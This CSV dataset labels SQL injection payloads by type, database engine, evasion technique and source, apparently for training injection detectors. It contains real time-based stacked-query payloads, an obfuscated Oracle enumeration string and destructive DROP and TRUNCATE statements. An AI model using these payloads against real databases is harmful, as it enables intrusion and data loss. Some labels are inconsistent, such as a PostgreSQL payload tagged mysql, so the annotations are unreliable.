payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
1;SELECT *,stacked_queries,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"SELECT * FROM table1 WHERE condition ; INSERT INTO table2 ( column1 , column2 , column3 , ... )",stacked_queries,unknown,case_variation,0.8,rule,sqliv3_csv,insert
"SELECT column1 , column2 , column3 , ... FROM table1 WHERE condition ; INSERT INTO Customers ( CustomerName, City, Country )",stacked_queries,unknown,case_variation,0.8,rule,sqliv3_csv,insert
"SELECT SupplierName, City, Country FROM Suppliers; INSERT INTO Customers ( CustomerName, ContactName, Address, City, PostalCode, Country )",stacked_queries,unknown,case_variation,0.8,rule,sqliv3_csv,insert
"SELECT SupplierName, ContactName, Address, City, PostalCode, Country FROM Suppliers; INSERT INTO Customers ( CustomerName, City, Country )",stacked_queries,unknown,case_variation,0.8,rule,sqliv3_csv,insert
"SELECT * FROM Customers WHERE City = @City GO; EXEC SelectAllCustomers @City = 'London'; CREATE PROCEDURE SelectAllCustomers @City nvarchar ( 30 ) , @PostalCode nvarchar ( 10 ) AS",stacked_queries,unknown,case_variation,0.8,rule,sqliv3_csv,unknown
"SELECT * FROM Customers WHERE City = @City AND PostalCode = @PostalCode GO; EXEC SelectAllCustomers @City = 'London', @PostalCode = 'WA1 1DP';",stacked_queries,unknown,case_variation,0.8,rule,sqliv3_csv,unknown
"SELECT column1, column2,... FROM existing_table_name WHERE ....; CREATE TABLE TestTable AS",stacked_queries,unknown,case_variation,0.8,rule,sqliv3_csv,unknown
"SELECT column1 , column2 , ... FROM table_name WHERE condition ; CREATE VIEW [Brazil Customers] AS",stacked_queries,unknown,case_variation,0.8,rule,sqliv3_csv,unknown
"SELECT column1 , column2 , ... FROM table_name WHERE condition ; CREATE OR REPLACE VIEW [Brazil Customers] AS",stacked_queries,unknown,case_variation,0.8,rule,sqliv3_csv,unknown
"SELECT CustomerName, ContactName, City FROM Customers WHERE Country = 'Brazil'; DROP VIEW view_name ; DROP VIEW [Brazil Customers];",stacked_queries,unknown,case_variation,0.8,rule,sqliv3_csv,unknown
"SELECT customername, contactname FROM customers; CREATE INDEX idx_lastname ON Persons ( LastName ) ; CREATE INDEX idx_pname ON Persons ( LastName, FirstName ) ; CREATE UNIQUE INDEX uidx_pid ON Persons ( PersonID ) ; CREATE VIEW [Brazil Customers] AS",stacked_queries,unknown,case_variation,0.8,rule,sqliv3_csv,unknown
"SELECT CustomerName, ContactName FROM Customers WHERE Country = ""Brazil""; CREATE OR REPLACE VIEW [Brazil Customers] AS",stacked_queries,unknown,case_variation,0.8,rule,sqliv3_csv,unknown
"SELECT customername, contactname FROM customers; ALTER TABLE Customers ADD Email varchar ( 255 ) ; ALTER TABLE Customers DROP COLUMN Email; DROP TABLE Shippers; TRUNCATE TABLE Categories;",stacked_queries,unknown,case_variation,0.8,rule,sqliv3_csv,unknown
"SELECT CustomerName, ContactName, City FROM Customers WHERE Country = ""Brazil""; DROP VIEW [Brazil Customers];",stacked_queries,unknown,case_variation,0.8,rule,sqliv3_csv,unknown
"SELECT Orders.OrderID, Customers.CustomerNameFROM OrdersINNER JOIN Customers ON Orders.CustomerID = Customers.CustomerID; SELECT Orders.OrderID, Customers.CustomerName, Shippers.ShipperName",stacked_queries,unknown,case_variation,0.7,rule,sqliv3_csv,unknown
"SELECT City, Country FROM SuppliersWHERE Country = 'Germany'ORDER BY City; SELECT City, Country FROM Customers",stacked_queries,unknown,case_variation,0.8,rule,sqliv3_csv,string_single_quote
"SELECT City, Country FROM SuppliersWHERE Country = 'Germany'ORDER BY City; SELECT 'Customer' AS Type, ContactName, City, Country",stacked_queries,unknown,case_variation,0.8,rule,sqliv3_csv,string_single_quote
"AND (SelECT 0O0O0O0O2x0O5)=UtL_inADDr.GEt_hOST_AddREsS} ( \(; SELECT dIstinCT (; COLuMN_Name +) fROm ( sElEct dISTiNcT ( ;colUmN_naMe `) , RownuM as limIt fRoM all_TAB_CoLuMNS+ ) /*0X2\;g)?BpufLX;)kX!*/ wHere LImit LIke 0X2B0O0x8 ),( ) AND 'I' LIke 'I",stacked_queries,oracle,case_variation|comment_whitespace|inline_comment|function_alternative,0.46,rule,sqliv5_json,unknown
;SELECT SLEEP([SLEEPTIME]),stacked_queries,mysql,case_variation,0.5,rule,sqlmap_xml,unknown
;(SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR]),stacked_queries,mysql,case_variation,0.5,rule,sqlmap_xml,unknown
";SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))",stacked_queries,mysql,case_variation,0.5,rule,sqlmap_xml,unknown
;SELECT PG_SLEEP([SLEEPTIME]),stacked_queries,postgresql,case_variation,0.51,rule,sqlmap_xml,unknown
";SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)",stacked_queries,postgresql,case_variation,0.51,rule,sqlmap_xml,unknown
";CREATE OR REPLACE FUNCTION SLEEP(int) RETURNS int AS '/lib/libc.so.6','sleep' language 'C' STRICT; SELECT sleep([SLEEPTIME])",stacked_queries,mysql,case_variation,0.5,rule,sqlmap_xml,unknown
;WAITFOR DELAY '0:0:[SLEEPTIME]',stacked_queries,mssql,,0.51,rule,sqlmap_xml,unknown
;DECLARE @x CHAR(9);SET @x=0x303a303a3[SLEEPTIME];WAITFOR DELAY @x,stacked_queries,mssql,hex_string,0.51,rule,sqlmap_xml,unknown
